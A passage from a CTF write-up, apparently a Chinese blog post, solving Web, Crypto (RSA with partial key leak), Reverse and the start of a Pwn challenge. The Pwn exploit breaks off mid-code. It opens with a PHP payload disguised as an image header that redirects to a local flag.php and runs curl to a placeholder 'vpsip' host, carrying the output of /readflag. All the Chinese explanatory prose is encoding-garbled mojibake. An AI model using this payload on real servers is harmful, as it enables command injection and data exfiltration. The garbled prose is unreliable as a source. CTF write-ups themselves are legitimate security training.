class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 8888</span></span><br><span class="line"><span class="comment">#define height 8888</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl http://vpsip:port/?id=$(echo `/readflag`)&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519114409376-1817342022.png" alt="image-20240519114404928"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h2><p>å…ˆå°†eç­‰å¼åŒ–ç®€</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153056089-343697192.png" alt="image-20240519153050449"></p><p>å¯ä»¥çœ‹åˆ°åŒ–ç®€æ–¹ç¨‹æœ€ååªæœ‰pæ˜¯æœªçŸ¥ï¼Œå·²çŸ¥é«˜ä½æ¡ä»¶ä¸‹e=(2+k)nï¼Œé‚£ä¹ˆk=e//n-2ï¼Œä»£å…¥å³å¯è§£å‡ºpçš„é«˜ä½</p><p>å·²çŸ¥pé«˜ä½æ³„éœ²ç›´æ¥æ‰“è„šæœ¬å³å¯</p><p>è§£é¢˜ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"></span><br><span class="line">k = e // n - <span class="number">2</span></span><br><span class="line">tmp = <span class="number">65537</span> + (k+<span class="number">2</span>)*n + (k+<span class="number">2</span>)+<span class="number">1</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1024</span>))</span><br><span class="line">f = e*x - (<span class="number">2</span>*(k+<span class="number">1</span>)*x^<span class="number">2</span> + (k+<span class="number">2</span>)*n + tmp*x)</span><br><span class="line">res = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    p_high = <span class="built_in">int</span>(root[<span class="number">0</span>])</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f1 = x + p_high</span><br><span class="line">    roots = f1.monic().small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>]) + p_high</span><br><span class="line">        q = n // p</span><br><span class="line">        e = <span class="number">65537</span> + k * p + (k+<span class="number">2</span>) * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153140820-1858714848.png" alt="image-20240519153128716"></p><h2 id="å¤å…¸å¯†æ–‡"><a href="#å¤å…¸å¯†æ–‡" class="headerlink" title="å¤å…¸å¯†æ–‡"></a>å¤å…¸å¯†æ–‡</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153315904-1153606556.png" alt="image-20240519153310923"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>ä¸€å¼€å§‹è¿˜æƒ³è¿˜åŸè¿™ä¸ªidaå·¥ç¨‹æ–‡ä»¶hhhï¼Œå‘ç°æ ¹æœ¬åšä¸åˆ°ï¼Œåé¢çº¯çœ‹armæ±‡ç¼–ä»£ç ï¼Œç›´æ¥æ‰‹æ’•å°±å¥½ï¼ŒåŠ å¯†é€»è¾‘åœ¨è¿™å„¿ï¼Œå¯†æ–‡ä¸€å¼€å§‹è¿˜æ‰¾åŠå¤©ï¼Œåé¢å‘ç°åº”è¯¥æ˜¯å­˜åœ¨å˜é‡unk_100003F10é‡Œé¢<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef.png#averageHue=%23302c2a&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=273&amp;id=ufa235f5b&amp;originHeight=341&amp;originWidth=1106&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=47929&amp;status=done&amp;style=none&amp;taskId=u632123d7-babc-4de8-b5f9-4bbaab5c3b8&amp;title=&amp;width=884.8" alt="image.png"></p><p>æ“å‡ºè„šæœ¬ä¹‹åä¹Ÿè¿˜æ˜¯å¡äº†ä¸€å°ä¼šå„¿ï¼Œæœ€åååº”è¿‡æ¥å¤§å°ç«¯çš„é—®é¢˜ï¼Œæ”¹ä¸€ä¸‹å°ç«¯å°±å¥½äº†ï¼Œçˆ†ç ´ä¸€ä¸‹ç›´æ¥å‡º<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = [</span><br><span class="line">    <span class="number">0x1fd7</span>, <span class="number">0x21b7</span>, <span class="number">0x1e47</span>, <span class="number">0x2027</span>, <span class="number">0x26e7</span>, <span class="number">0x10d7</span>, <span class="number">0x1127</span>, <span class="number">0x2007</span>,</span><br><span class="line">    <span class="number">0x11c7</span>, <span class="number">0x1e47</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x11f7</span>, <span class="number">0x2007</span>, <span class="number">0x1037</span>, <span class="number">0x1107</span>,</span><br><span class="line">    <span class="number">0x1f17</span>, <span class="number">0x10d7</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x1f67</span>, <span class="number">0x1017</span>, <span class="number">0x11c7</span>, <span class="number">0x11c7</span>,</span><br><span class="line">    <span class="number">0x1017</span>, <span class="number">0x1fd7</span>, <span class="number">0x1f17</span>, <span class="number">0x1107</span>, <span class="number">0x0f47</span>, <span class="number">0x1127</span>, <span class="number">0x1037</span>, <span class="number">0x1e47</span>,</span><br><span class="line">    <span class="number">0x1037</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x2787</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        <span class="keyword">if</span> (((j * <span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>) + <span class="number">0x14</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)) + <span class="number">0x1e</span>) == k[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>) </span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h2><p>è¿˜çœŸæ˜¯ç¬¬ä¸€æ¬¡é‡è§è¿™ç§ï¼Œç»™äº†ä¸ªsoå’Œä¸€ä¸ªpyæ–‡ä»¶ï¼Œä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯èƒ½ä¸èƒ½ç»™soè§£åŒ…ä¹‹ç±»çš„ï¼Œå› ä¸ºpyæ–‡ä»¶é‡Œé¢å¯†æ–‡ç»™äº†ï¼Œå°±å·®ä¸€ä¸ªåŠ å¯†é€»è¾‘ï¼Œæ‰¾äº†ä¸€å¤§åœˆè¿˜æ˜¯æ²¡æ‰¾åˆ°ï¼Œæœ€åè¿˜æ˜¯æƒ³åˆ°äº†è°ƒä¸€ä¸‹soæ–‡ä»¶ï¼Œåƒè°ƒå®‰å“é‚£æ ·<br>åŠ¨è°ƒèµ·æ¥é”å®šå‡ºäº†ä¸¤ä¸ªå‡½æ•°ï¼Œå¾—çŸ¥è¾“å…¥çš„æ•°æ®å…ˆç»è¿‡base64ç¼–ç ä¹‹åå†è¿›è¡Œçš„å¼‚æˆ–<img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b.png#averageHue=%23bff8fb&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=158&amp;id=u3e8cb98a&amp;originHeight=197&amp;originWidth=863&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=26226&amp;status=done&amp;style=none&amp;taskId=u35d4d91b-bb47-4e0d-820f-1198f5bce0c&amp;title=&amp;width=690.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b.png#averageHue=%23c0f9fc&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=153&amp;id=u8cca14f4&amp;originHeight=191&amp;originWidth=472&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=12594&amp;status=done&amp;style=none&amp;taskId=u35d995fb-98a6-4327-9277-5d0144be3a2&amp;title=&amp;width=377.6" alt="image.png"><br>åŠ å¯†é€»è¾‘çŸ¥é“äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“å¼‚æˆ–çš„å€¼æ˜¯ä»€ä¹ˆï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å­˜åœ¨r18é‡Œé¢çš„ï¼Œæœ€åè°ƒäº†ä¸€ä¸‹æ‰¾ä¸åˆ°è§„å¾‹ï¼Œæœ€åæƒ³åˆ°é‡æ–°å†™ä¸€ä»½å¯†æ–‡è¾“å…¥ï¼Œç„¶åæŠŠåŠ å¯†ä¹‹åçš„æ•°æ®è¾“å‡ºä¸€ä¸‹ï¼Œå‰åå¼‚æˆ–å¾—åˆ°æ‰€éœ€å¼‚æˆ–çš„å€¼ï¼Œæƒ³åŠæ³•è¾“å…¥ä¸€ä¸ªè¾“æ„é€ å‡ºç»è¿‡base64ç¼–ç ä¹‹åé•¿åº¦ä¸º56çš„æ•°<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144.png#averageHue=%23533272&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=225&amp;id=uc5ca83a7&amp;originHeight=281&amp;originWidth=586&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32753&amp;status=done&amp;style=none&amp;taskId=u021a7de5-9bc0-4032-b65f-eb37a4f769e&amp;title=&amp;width=468.8" alt="image.png"><br>exp:<br>å…¶ä¸­aaæ˜¯ä¸Šå›¾æ„é€ çš„â€œ55555555555555555555555555555555555555555555â€çš„base64ä¹‹åçš„å€¼ï¼Œç„¶åbbæ˜¯è¿è¡Œä¸Šå›¾ä¹‹åå¾—åˆ°çš„å¼‚æˆ–ä¹‹åçš„å€¼ï¼Œæœ€åè¿è¡Œå‡ºæ¥çš„ç»“æœè§£ä¸€ä¸‹base64å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">aa = [<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>]</span><br><span class="line">bb = [<span class="number">120</span>, <span class="number">76</span>, <span class="number">101</span>, <span class="number">9</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">103</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">67</span>, <span class="number">116</span>, <span class="number">93</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">28</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">105</span>, <span class="number">124</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">98</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((aa[i]^bb[i]))^encry[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928.png#averageHue=%23fbfafa&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=321&amp;id=u21ca8627&amp;originHeight=401&amp;originWidth=1001&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=29873&amp;status=done&amp;style=none&amp;taskId=u57d8f6b1-9320-4cba-8df7-3614d3a13ff&amp;title=&amp;width=800.8" alt="image.png"></p><h2 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h2><p>è¿›å…¥ä¸»å‡½æ•°ä¹‹åé€»è¾‘è¿˜æ˜¯ç›¸å½“æ¸…æ¥šçš„ï¼Œé”å®šäº†ä¸€ä¸‹ä¼ªéšæœºæ•°<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09.png#averageHue=%23c6fbfe&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=30&amp;id=u86f42e8a&amp;originHeight=37&amp;originWidth=279&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=1960&amp;status=done&amp;style=none&amp;taskId=uc34bcd71-5b39-4a72-8912-972a5d90723&amp;title=&amp;width=223.2" alt="image.png"><br>åŠ¨è°ƒè·‘èµ·æ¥å–å‡ºéšæœºæ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0X75</span>, <span class="number">0X25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0X7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span></span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ä»åå¾€å‰é€†å°±å¥½<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> indexArray[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> buffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> outputBuffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> originalNumbers[] = &#123;</span><br><span class="line">        <span class="number">94</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">157</span>, <span class="number">32</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">227</span>, <span class="number">214</span>,</span><br><span class="line">        <span class="number">182</span>, <span class="number">105</span>, <span class="number">24</span>, <span class="number">193</span>, <span class="number">153</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">159</span>,</span><br><span class="line">        <span class="number">25</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">174</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">247</span>, <span class="number">122</span>,</span><br><span class="line">        <span class="number">149</span>, <span class="number">77</span>, <span class="number">23</span>, <span class="number">135</span>, <span class="number">148</span>, <span class="number">84</span>, <span class="number">191</span>, <span class="number">185</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byteSequence[] = &#123;</span><br><span class="line">        <span class="number">128</span>, <span class="number">180</span>, <span class="number">64</span>, <span class="number">184</span>, <span class="number">148</span>, <span class="number">200</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">238</span>, <span class="number">69</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">157</span>, <span class="number">60</span>, <span class="number">136</span>, <span class="number">140</span>, <span class="number">169</span>, <span class="number">107</span>, <span class="number">174</span>, <span class="number">125</span>, <span class="number">135</span>,</span><br><span class="line">        <span class="number">214</span>, <span class="number">135</span>, <span class="number">15</span>, <span class="number">218</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">147</span>, <span class="number">169</span>, <span class="number">144</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">201</span>, <span class="number">231</span>, <span class="number">83</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> shuffledIndices[<span class="number">38</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> encryptionKeys[] = &#123;<span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0x75</span>, <span class="number">0x25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0x7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span>&#125;;</span><br><span class="line">    <span class="type">int</span> permutationOrder[] = &#123;<span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dataXor[] = &#123;<span class="number">0xBF</span>, <span class="number">0xD7</span>, <span class="number">0x2E</span>, <span class="number">0xDA</span>, <span class="number">0xEE</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0x10</span>, <span class="number">0x83</span>, <span class="number">0x73</span>, <span class="number">0xAC</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x12</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0xE2</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3D</span>, <span class="number">0x07</span>, <span class="number">0x4A</span>, <span class="number">0xE8</span>, <span class="number">0x96</span>, <span class="number">0xA2</span>, <span class="number">0x9D</span>, <span class="number">0x4D</span>, <span class="number">0xBC</span>, <span class="number">0x81</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x78</span>&#125;;</span><br><span class="line">    <span class="type">char</span> inputData[] = <span class="string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        indexArray[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">37</span>; k &gt; <span class="number">0</span>; --k) &#123;</span><br><span class="line">        <span class="type">int</span> swapIndex = permutationOrder[<span class="number">37</span> - k] % (k + <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> tempIndex = indexArray[k];</span><br><span class="line">        indexArray[k] = indexArray[swapIndex];</span><br><span class="line">        indexArray[swapIndex] = tempIndex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];</span><br><span class="line">        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, outputBuffer[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>IDA8.3è¡¥å…¨ç¬¦å·è¡¨ï¼Œå¼€äº†ä¸ªNXï¼Œä¸å½±å“æ‰“æ ˆæº¢å‡º </p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 